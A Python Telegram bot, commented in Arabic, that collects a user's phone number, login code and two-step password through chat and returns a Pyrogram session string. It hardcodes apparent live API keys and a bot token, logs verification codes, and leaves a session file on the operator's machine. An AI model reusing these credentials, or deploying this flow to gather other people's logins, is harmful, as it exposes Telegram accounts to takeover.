import telebot
import logging
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

# ---------- Logging ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ---------- بياناتك ----------
API_ID = 21173110
API_HASH = "71db0c8aae15effc04dcfc636e68c349"
BOT_TOKEN = "2132657853:AAGE6D-W-1tbANoW2aZOf4wJPL-bT-1QnhQ"

bot = telebot.TeleBot(BOT_TOKEN)

# ---------- Start ----------
@bot.message_handler(commands=['start'])
def start(message):
    logging.info(f"User {message.from_user.id} started bot")

    msg = bot.reply_to(
        message,
        "📱 ابعت رقم الهاتف مع كود الدولة\nمثال:\n+201000000000"
    )

    bot.register_next_step_handler(msg, get_phone)

# ---------- رقم الهاتف ----------
def get_phone(message):

    try:
        phone = message.text
        logging.info(f"Phone received: {phone}")

        app = Client(
            "session",
            api_id=API_ID,
            api_hash=API_HASH
        )

        app.connect()

        code = app.send_code(phone)

        msg = bot.send_message(message.chat.id, "💬 ابعت كود التحقق")

        bot.register_next_step_handler(
            msg,
            get_code,
            phone,
            code.phone_code_hash,
            app
        )

    except Exception as e:
        logging.error(f"Error in get_phone: {e}")
        bot.send_message(message.chat.id, f"❌ خطأ:\n{e}")

# ---------- الكود ----------
def get_code(message, phone, phone_code_hash, app):

    try:
        code = "".join(filter(str.isdigit, message.text))
        logging.info(f"Code received: {code}")

        try:
            app.sign_in(phone, phone_code_hash, code)

        except SessionPasswordNeeded:

            msg = bot.send_message(
                message.chat.id,
                "🔐 الحساب فيه تحقق بخطوتين\nابعت الباسورد"
            )

            bot.register_next_step_handler(msg, get_password, app)
            return

        session = app.export_session_string()

        logging.info("Session generated successfully")

        bot.send_message(
            message.chat.id,
            f"✅ الجلسة:\n\n`{session}`",
            parse_mode="Markdown"
        )

        app.disconnect()

    except Exception as e:
        logging.error(f"Error in get_code: {e}")
        bot.send_message(message.chat.id, f"❌ خطأ:\n{e}")

# ---------- التحقق بخطوتين ----------
def get_password(message, app):

    try:
        password = message.text
        logging.info("Password received")

        app.check_password(password)

        session = app.export_session_string()

        logging.info("Session generated after 2FA")

        bot.send_message(
            message.chat.id,
            f"✅ الجلسة:\n\n`{session}`",
            parse_mode="Markdown"
        )

        app.disconnect()

    except Exception as e:
        logging.error(f"Error in get_password: {e}")
        bot.send_message(message.chat.id, f"❌ خطأ:\n{e}")

# ---------- تشغيل ----------
logging.info("Bot Started")

bot.infinity_polling()
